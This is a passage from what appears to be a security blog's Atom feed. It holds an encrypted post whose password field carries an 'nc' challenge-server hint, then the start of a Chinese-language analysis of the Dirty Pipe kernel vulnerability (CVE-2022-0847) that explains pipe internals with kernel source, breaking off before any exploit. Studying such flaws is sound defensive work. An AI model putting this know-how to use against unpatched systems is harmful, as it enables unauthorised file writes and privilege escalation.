75b2fcc7194e16062c5f012d97e8f6251d776faac870606d48e14c2418fa89bbf5aa5933b8d16970955b8f5b0115e5519044ba56643ae822035d2a9fb26eae96d05d5ec638877a41bc49e60e18cf1a599bfef594f9fb315535abfbc1c39e20910524c2766d4301e2631eb6e398007ac851421f8023e65b73d0ad59c3c4ec429e8af7a1d31270fa3d07a1f846d34db11521838b27306c0f4cf2a1a4839062c9bc2962c0205fae1f226849def5694a49561f7681f99b92b2fe4868f1a6996a395a393b0ff896d6e4219cee828d2604cce53f8d86df52b99ba0d7682da1e3da8e851e2314e8de7ee71084585d9240cc6d16dee8a5b22f5df3c0931aa29da1644e61dda17819498f7fffd2ed0aa9ef451f0b8b5bc71825a78bc3352266d909a1e143863837831faef30f1c934b85ece9f5b9b409748df75933ef7cf4ce541925f62e25dac1170ca263477c0ebe963364532e0dfa0933ce96e438499c15f275d176db75d8b842372750c7a6b78728fc654834846f0597ae151ea4a904487941dec34b241e1656dd0f36b214131f4987de69dadff997e4851e91a61031618a204d28bac8b017c30e3bd326becbca75434789a4022cfb098ae5a73877e3de79d8fb9e3fc2650d86b479ee24b0fac66e6b5ae1d33ca8f12fc7ea5617f0a01b33c1cdd9b3cca3ecadc1d240dc1a965413ed8214853730166240f9a22ef8e77c0f231f56faca61b277a06a4c9eceb5d54a3a89322baa6c98ccab35040be511440b09ce3856dea2ef23b0d87852794cea13e71067c41e86f816599a65f20e6bb4e5b62867903f470ce8049ed7ee40eba2c9c4360978b15d6f383d82cac2888c49c0e6e16f897bdbc50259f06326a699b049838d000f129dd28147cf4d1fad1eab2f23ad4cc451a7a2e78685d1d2d3be46ac019867e42af0793007b6c415efffc39fe4c8956fe32fb25667e4096801e706f377367346aca5c9a0d6c0b674be332ef17fada3cf14988e1ca29bc87c14aeb9cee6289a54899a90b4d4652f4634864d956d2bc6e0fc72aea6e13ccaea311b2849c481eec2242f48a045528d13347293078bf1405a0242c72fdf6fae2e98128227e8d5de09b96f2f0a530af4a2f5caf5824ecc1b3ec0cfdb0ae68be888b38c0f00844b143a69708e13e7eb087f4827d93237ade2175bc2a5f96c0c583a80be49466058b3257648ce5a475d31044fa33a192750309fbc14a73880157ed2fb16e382a3c6c496ca6acf1353fb618095637c70e1c486da116391792fb39fa83a10f3260e8db52dcb7054f570b12344e0fbcffa55a0a6233278a05ef2952715e4d0613b3085d27f2fed8f631d9039679bec3bee13853e0ed40fd1f15ff9cab1617e46160810c2ed8c2a91f3ce5ed4dc1eef75f24df504581bacf1e9ad6fb9ad7ab8d50f3a8170071b75df08f01e35d4d99ae59fe6e014cb08851309f8cdcbcec66c1dba12d9b89895c803b11336c53abd285e97f4db902a0b0ee1631e55b2a1ec6b097b4dd09b17a509386ed7d6b0f1a95da6247974a8e8b971be307e49bb9743ed61e7ad66e931b7f2b6be4fbdc850d3ebd0c973cabb547b12cedde0dd058b9cad9b635d58800457661a27d477deee271b7fb949ec2eb5a16af843e9ebe0e91fab2b1874341100faf5098f339acffd3a2a49438c6bdca32985342f7b1879416f478b2ea2d3a1674df2006011eeba683916818bd2500b780aedcdb904f569317592f65cdf59b35e9ebd8694f2581655457df9f4124571d3e1714e4809a5744506a3f2b087eea9567f7b36443fd1bf4ead17fa0d6d1d21a64ba6f1510aa3df85c7b7c0cfa7969ab9c951a77a2c765cd232e865f23525c1ca97ca356e58e2613ce150b6310612e3fe03dbe4286792b86b81e618d44d918abd9271d30bfbbcaa50351f418391841b0c7cca21a0f2ee12a03f429efc8ee46f2789934ee98f6916ce4ca35a7ec0a174115ffa65c55b7c0c19b66254469bc25a76867bf3047f3667a98e6b10151a2f9463b7c3f35ebe9baacb89f9a115d691a15a77dfd9beae19af41d65a71d3ef9e555fefdb17249740d54c1d3fc6236a83711a5c171248a0956cb89830ec438f045d00bf0ef689311a9fbb6cbbe483da13f66061ac93f4b078627280d4eb0ea46de2a42331b54469c2c53c7d5f87e80becc0f941eceb69bb45ca223c7cf0bec504e776581ba6200bfe14b42bdce1ba9d6b31567aec0d6ace4d42ac90faaa855fb5e9ce8bbd6a5004b9a199bb2d0bcdb73d2c1898944f7716fcbef520ae2819ce5341290a377e65a467515d3ab993ce6b137472ee8cc24ce4b33d4db46c04fa40eb88b60796b91ab2f89c3b7abc271ffdeec1c2dcdd08980e0d24c3258524c91b8ef3cc118817ec16fcf496b385f1048e844b56968fdfd68dcf4c17fee0bb5a40688ab3a6a3650f16a4a9b28e8327ac3cbd5c9f48086745079eb5cbda2efa85e10da91af35ae97c3dd8bb15c72fa4ac5fbd823f2e98446301d630783111b916ae539c95b1051a8ca010609b2a40c61f0fec3d4b537f77fa6138b1fe5630ab87a8e1c0a6818caa1ed1a3fc15f719d312296d62607a699a9311eacd215357b018c29b0e82387d5aae91f3b525d2100dc05ba73c225b285a3c5f7937174bfb569680c7ae4562006543697cb2d9c661e394a69edd483d22b0681d7d18cc63518e4f4b5312624ae21bab2d8013909c44ac35324d6fd0d568bd7dd1a5c04ece10f7069e1b5b28f018453450afe73c370a9a79105d2571573f3ae452fef8da2aba3695fbf6719ed9fb641c48a11b1958ec7115454b8d8a87c86111f2dcae8fad6b45f7d1bea528cefeee98b1aebac34a1d9f2fff80c810e8f5b97381e53eb6e3c748eca405446d4560b78ef3b2514d21408fa33ff5f3bbc223349799d6da8a86295779c5aada9415478f9ba64b0b47da42f9e88ebe760d17a8e8dd4710edac628489279270125806396be6474c409b88086cc548d03c91c11e71b7e999bcc688c2edad81318ffc923f27526e5ce79afd8f46c151010bbd7c318751d4f10b3642f4b889ab68257741f57ab87210a6b710e0ee83714905aaf80b2a11aa0f4701cb2dc64888270bd87fe1dc0e6b11392c96ebcfde9f079f664fa9fe7f0ea095b6d85502f149a04c3cfbd7bfbdfd4ba6f7d56639dec40acf84e3a7f3c27fe355c6dccf3ddd1040ab8bc78426c827ae605e3a6eaf9f094bc7ec9e56739d07189bce0a616f7847fb37b219beb1ba414ea97ddfdf2c407ab508600d9287773bea29d313bca89870104576a1571f5307653600d391107dcff437d3a9ec2d9f9d822e32328731b38afc764c92ab6cdf5a3ec8bf1811060e478b1767b5c75384744e58102ae4f0245d208a2d117ed6c5e865356786270ac78a20db8472744932c4615dcfb9220234632b3c4158fb7334be3e8b12b729e699dcb63d02e9ac99c11f6a123a247da5992a7e49f336927e53a900045e997df991ac268cb11e58282fb46223f0fe7678c6bdff196b442baa42cbcf2b8db74be90f200b71d829f7239f506e549911f62da77b1293981a471f0f1f8a3f00c8093d3bf5bbe834090280f9eaab0661f193886e3555e1e038d4f0a39bd1984e3dea2a8a82efe0f6f4741fae134300f22cd32b256df826a95234f28804f8d174a5c76920abce4e842e1ce263ba7ea0f7463c554fec87edd8c3df43251dbaa65b8df33b7cbde6767bb9c05ffa5b0d07872107758de690123cfb1328bef599f23e70ebdd687ae4ce68d5c596bd40397b816ff99b45de8dcfd3c74758bb5f27b5019db8fffc1255d5ea2c0b79259b85ed0c0c7ef25f2c443588aa1a2ab0a9f22bdfaccb5608fa9dd8da8c1458160ab42478dff3871e1b27f5723e6344bb3751636ecca45464d6d8d925433d7282bddf3249c2c0220683c5a1117c6b93c0b9962d8ac98e0395b8923b6bb59eb8eba72019bc19122f1168c96a89ed1dde38bcb9433bc1f7a36a9e7b39ed0bc5e4444cb4ef7b5d5957f18206ec56248728390a03856b6fe5dfb73406d07b87b7fd1f82961d4fb140925ff220b2098e37d009af386ccba487ddeed8f127d4b347063126a6d97b3880c22cd404fa5d78522927734c30e4d2c263de152c0601997e8923536e99e8c638a204a560068865836360edf61d1cec66b798ed948c1a8309ab2f20f9e0282930fe1c9c807935f75aef37ac9bd50283aea5a292c85d349a650605774db42be716dda6dca4903ea0e676a92724f073e2ff7b10e2fc30f71ecdefa4bcec5ff738181ab1de4563580aec2c109259ec1225e649f2b3b68c218470c1aa3fe1907b3159374fec31ac5bf5135bf961ae36aee0d3579f9835c4cd7287cf4389aefa002b2b950cbf260855ad3dbf34abb4e6b2af9d26e989e2dae6fd8ad1bc8a76b35608d2372aa92f111c5b5e15d8258067c46a732baedaab78e47160cdc5e5923fafd60d9c99446342b1f78444d4ffa0ac532936ac7fc66141fe03e29bb8d0a3c05eacc5a4572e23689eb675de27615da69e72153e0f744b11dd78a32af6ace939bb296381721f7a2c629fcd12263c309fea75ed65c7d9171b596d9ffc1453d0118d24479768853ab5a53a693a7c477311767f311673fe11e72b49894b2a6666b2b7e6149fd50b633dacbe76bea53fa1979851e4f858215e971aac90ebe1aabc36fedd345e4e18db46d594de7a2d3be1033e25dd1130930dc27cc187c162c59fbb51872313132c3f6ce42c814f9035b12ecf1b2d8c4671fd97b119ea6f2bd38f26ce131e5902e0379b24d1854c14f33340cea6a487287e4d96d99c6c23a151e9849e6bdcdf51b074fc81ef85ef6d12c86bcbc96a15845cfd00dea255b087a9d7419e96ad5f893e1686ecd7b043d68098134a9069afe7f51a3b27a2f56b2652391b3c20840078db825c60552e46362608fd31a7c1f85b6a4fc66f66e6a415d13dcd07aa69ee3b80c1d9bc4ecdaec9f3727038832e6dc2747c7c14bf58cb9704aba164a477c47e6d015ac2f5fb2ce2a5ba777d1691e30c3d322854d71e720abd86467bba8861c4ce578be0fd21b4bc6de4a95c7de3c958b8e949b395113872bd2b404d4b1389a860a20ef882434ed2b56d70ee7ecc22bae9eb557d108701ca54faf030236df99c1128f36e150f1dbccd18cb750e4c90d1ef040bde27a8f97cbceab8d0c1ef5f8a2bcf3692a46f8271b1014d22839171154031bb1f0472b39ae0fbb14450a0896b4edabda716233b00248e1b6ffebc28972d87be9ce54560fa6d6fc88e14bbe2d2edfc93895ca9c90a34798b5febe34843f916ea414c7d1eb811be9952f0efd69df2da456724881b500e64509d18017841fa1c22bc6eb8a56cd96f04279c9258519818ec1134f97c4889d672d9b86e741f7aa4efae4af2524df100908dab5e3fd4a7548a6eb8dba3d3991b9ac869d28b4e4fdc9390385d8fa25803bd5ed800c0a2dd36b15139c00f22f5ec605078e6e28508b4cd5895d322ea31c945359e55d0e0977041af5369c909c1200038e7b3a8603a443ec047c05cd52f2164f6b42646bef7b0699112b6dcb9042ca954e0861821c87e068d4a67baad9246c68d3829cfe35396af9efc2427d0797f0d07dc65d2df720d34e7acb47be9472582f422cb8da6c41bdff228a9cc9165d86fb136ed29e2d7ee79610c0fecf63f7e9591d25eb2aae8d9b222450361f62098d41909a6540d1fee40a6657a1d7e0b42342903f330ff0457a83ba7eb16025316b595bae4ea294a3f840cd59f68331e66a5c3441f3d4f378f6a0f8c6d00b9977af8e0a09f7ed322ffac708fa5bbfb39e84c03c670ad2f852711fddb8559995496f7ae9a6ef218e8dca4d8901b02719578116741eb02794faafa50e905881f8f0079eef23cce85bdd04a44149efbcd2d0f5d953532f00262e15888e6d61ae1e7585a52fe15bf408e836403e31c18f3317c844954099dabc1c175dae58dd234a4a6e153b97b9d33a8a79076634e714ab6554647173dbf123a1db45a54a130d793bbe8a1d00c31cf0d66099ac041f861a25b1ab1febccba83051654530d179ade407b8b35bfb25ce6986f04efdb9671ffc6cee4106d4d59bf8c8932d61d25fa6ffc8f1265004cab14b478edcd617e3593d8f2bb23e46032ff90d7d5cd128e29d6e58cc775c78b07bec4b0a5bb7196813c6fe3c4ab52f705a4cc6627334ca938eb789fd40c60da8be5babb630c975bdf7e7cc190cb5305edf2130ec5f8655ed29e628be2c441a67a5e5d3e3cae7e0290557e85b288ec9e174055264a8787eb7c486398f9993bdbbd6041d7f29c82b42ea7c1f3e7060d7ffa70d188d3f5ed98cb9dc89fda0e9de6ae894c2f168f1034f9a3986b52b44c905debade59dc1b8d5a48755f2ddf500c4108019dbca361665fe13e120bc5ba127c99e49ef81a530f7bb4dbd947a44cb241a535d8c50ce7a050bd35aa657b3bf9cc05d94532425a093771f809cacfa0313cb4953f4a47e7f722ad37eee10bc217cb242d6509f1ed53905e982bcc9dbefd06a72bb06ae0edd4d261ac668f1f143667978fe326f9224567772bb617807d8215e98904dade2fa8858c27857334298373300d473c8eb55434a96263e0a31f296ac7ffc8212bb00e93bb2837b4db051947a58991f4109d567452374dddc32521688a34b555bd667febed2757f6e1a18af8c21a6fd6e016b45290df317a9e9c312c6e40f34ecd0b61cf243963a1c379332283ad1737c784e1f2e3ed7fd1e46d73a8b7e3017ab49c22eec325b575e440099ad8d199d5fe227566b8a6e3190fd17183bc107cd31c77dabf4e4fb1025a64eeca9a19c5fe91bda666b0801b4245a4e80daacc9df685715f77b3fd606b54ac10f0f8b706e728e576a173fb91702e9bd02859be9ec6c9fa94563a32caf21f279a7beb0c10688991f17bcfdb089912fbf05037d8ae122e8c3b2901958c49dbc9d5bc12ce37488a1467a96dd3e6b3ef012a50eacce387fb31deb30edd8dbcbcd4fb15402eea49d15e127a476a585084ff3166df80a77db8c449ede363b26738dcd8fab95b4a05b9d1c5d873af0d4582bb684cc92ab88dbad7577342564e1be3bc9cc456814991bcb24a682db89a62a060378744a980620357d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>【CVE.0x06】CVE-2022-0847 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/"/>
    <id>http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/</id>
    <published>2022-03-12T11:39:02.000Z</published>
    <updated>2022-03-21T07:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>我超，管人痴！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2022-0847 是这两天刚爆出来的一个热乎的内核漏洞，漏洞主要发生在对管道进行数据写入时，由于未对原有的 <code>pipe_buffer-&gt;flags</code> 进行清空，从而导致了<strong>可以越权对文件进行写入</strong>；由于这样的漏洞形式类似于“脏牛”（CVE-2016-5195），但更加容易进行利用，因此研究人员将该漏洞称之为「Dirty Pipe」</p><p>据研究者描述，目前 <strong>5.8 版本以上的内核均会收到该漏洞的影响</strong>，在 <strong>5.16.11</strong>、<strong>5.15.25</strong>、<strong>5.10.102</strong> 版本中才被修复，影响范围不可谓不大，因此这个漏洞也得到了高达 7.8 的 CVSS 评分（CVSS 评分好像改版了，2.0 的标准只有 7.2分）</p><p>这个漏洞的发现源自于一次 CRC 校验失败，感兴趣的可以看<a href="https://dirtypipe.cm4all.com/">原作者的博客</a>，是一段十分奇妙的旅程（笑）</p><p>本次选用进行分析的内核源码为 Linux 5.13.19（因为笔者前些天刚好编译了一个这个版本的内核，刚好受到该漏洞影响，就直接拿来用了）</p><p>在开始分析之前，我们先来补充一些前置知识</p><h2 id="pipe：管道"><a href="#pipe：管道" class="headerlink" title="pipe：管道"></a>pipe：管道</h2><p>稍微接触过 Linux 的同学应该都知道「管道」这一 IPC 神器。而在 Linux 内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> （即创建了一个虚拟文件节点）来表示的，其中在节点上存放管道信息的是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息</p><p>当我们创建一个管道时，内核会创建一个 VFS inode 、一个 <code>pipe_inode_info</code> 结构体、两个文件描述符（代表着管道的两端）、一个 <code>pipe_buffer</code> 结构体数组，下图是一张叙述管道原理的经典图例</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="非常经典的一张图"></p><p>用来表示管道中数据的是一个 <code>pipe_buffer</code> 结构体数组，单个 <code>pipe_buffer</code> 结构体用来表示<strong>管道中单张内存页的数据</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: 管道缓冲区中存放了数据的页框</span></span><br><span class="line"><span class="comment"> *@offset: 在 @page 中数据的偏移</span></span><br><span class="line"><span class="comment"> *@len: 在 @page 中数据的长度</span></span><br><span class="line"><span class="comment"> *@ops: 该 buffer 的函数表， 参见 @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: 管道缓冲区的标志位，参见上面</span></span><br><span class="line"><span class="comment"> *@private: 函数表的私有数据</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>创建管道使用的 pipe 与 pipe2 这两个系统调用最终都会调用到 <code>do_pipe2()</code> 这个函数，不同的是后者我们可以指定一个 flag，而前者默认 flag 为 0</p><p>存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">get_pipe_inode()</span><br><span class="line">alloc_pipe_info()</span><br></pre></td></tr></table></figure><p>最终调用 <code>kcalloc()</code> 分配一个 <code>pipe_buffer</code> 数组，默认数量为 <code>PIPE_DEF_BUFFERS</code> （16）个，即一个管道初始默认可以存放 16 张页面的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> pipe_inode_info *<span class="title function_">alloc_pipe_info</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span> =</span> get_current_user();</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_bufs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class="line"></span><br><span class="line">pipe = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer),</span><br><span class="line">     GFP_KERNEL_ACCOUNT);</span><br></pre></td></tr></table></figure><p>管道形成的核心结构如下图所示</p><p><img src="https://s2.loli.net/2022/03/12/cyUY4fmwHr5I6ts.png" alt="image.png"></p><blockquote><p>page 结构体用以<strong>唯一标识一个物理页框</strong>，参见 <a href="https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/">https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/</a></p></blockquote><p>管道的本体是一个 <code>pipe_inode_info</code> 结构体，其管理 <code>pipe_buffer</code> 数组的方式<strong>本质上是一个循环队列</strong>，其 head 成员标识队列头的 idx，tail 成员标识队列尾的 idx，<strong>头进尾出</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_inode_info - a linux kernel pipe</span></span><br><span class="line"><span class="comment"> *@mutex: 保护一切的互斥锁</span></span><br><span class="line"><span class="comment"> *@rd_wait: 空管道中读者的等待点</span></span><br><span class="line"><span class="comment"> *@wr_wait: 满管道中写者的等待点</span></span><br><span class="line"><span class="comment"> *@head: 缓冲区的生产点</span></span><br><span class="line"><span class="comment"> *@tail: 缓冲区的消费点</span></span><br><span class="line"><span class="comment"> *@note_loss: 下一次 read() 应当插入一个 data-lost 消息</span></span><br><span class="line"><span class="comment"> *@max_usage: 在环中使用的 slots 的最大数量</span></span><br><span class="line"><span class="comment"> *@ring_size: 缓冲区的总数 (应当为 2 的幂次)</span></span><br><span class="line"><span class="comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span></span><br><span class="line"><span class="comment"> *@tmp_page: 缓存的已释放的页面</span></span><br><span class="line"><span class="comment"> *@readers: 管道中现有的读者数量</span></span><br><span class="line"><span class="comment"> *@writers: 管道中现有的写者数量</span></span><br><span class="line"><span class="comment"> *@files: 引用了该管道的 file 结构体数量 (protected by -&gt;i_lock)</span></span><br><span class="line"><span class="comment"> *@r_counter: 读者计数器</span></span><br><span class="line"><span class="comment"> *@w_counter: 写者计数器</span></span><br><span class="line"><span class="comment"> *@fasync_readers: reader side fasync</span></span><br><span class="line"><span class="comment"> *@fasync_writers: writer side fasync</span></span><br><span class="line"><span class="comment"> *@bufs: 管道缓冲区循环数组</span></span><br><span class="line"><span class="comment"> *@user: 创建该管道的用户</span></span><br><span class="line"><span class="comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line"><span class="type">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> max_usage;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="type">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nr_accounted;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> readers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> writers;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> files;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> r_counter;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> w_counter;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="管道函数表："><a href="#管道函数表：" class="headerlink" title="管道函数表："></a>管道函数表：</h3><p>阅读 pipe 系统调用源码，注意到如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_pipe2()</span><br><span class="line">__do_pipe_flags()</span><br><span class="line">create_pipe_files()</span><br><span class="line">alloc_file_pseudo()</span><br></pre></td></tr></table></figure><p>在创建管道文件的函数 <code>create_pipe_files()</code> 中，传入 <code>alloc_file_pseudo()</code> 的函数表为 <code>pipefifo_fops</code>，这便是管道相关的操作的函数表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create_pipe_files</span><span class="params">(<span class="keyword">struct</span> file **res, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>该函数表中定义了我们对管道的相关操作会调用到的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="管道的写入过程"><a href="#管道的写入过程" class="headerlink" title="管道的写入过程"></a>管道的写入过程</h3><p>查表 <code>pipefifo_fops</code> 可知当我们向管道内写入数据时，最终会调用到 <code>pipe_write</code> 函数，大概流程如下：</p><ul><li>若管道非空且上一个 buf 未满，则先尝试向上一个被写入的 buffer写入数据（若该 buffer 设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位）</li><li>接下来开始对新的 buffer 进行数据写入，若没有<code>PIPE_BUF_FLAG_CAN_MERGE</code> 标志位则分配新页面后写入</li><li>循环第二步直到完成写入，若管道满了则会尝试唤醒读者让管道腾出空间</li></ul><p>这里我们可以看出 <code>PIPE_BUF_FLAG_CAN_MERGE</code> <strong>用以标识一个 pipe_buffer 是否已经分配了可以写入的空间</strong>，在大循环中若对应 pipe_buffer 没有设置该 flag（刚被初始化），则会<strong>新分配一个页面供写入，并设置该标志位</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 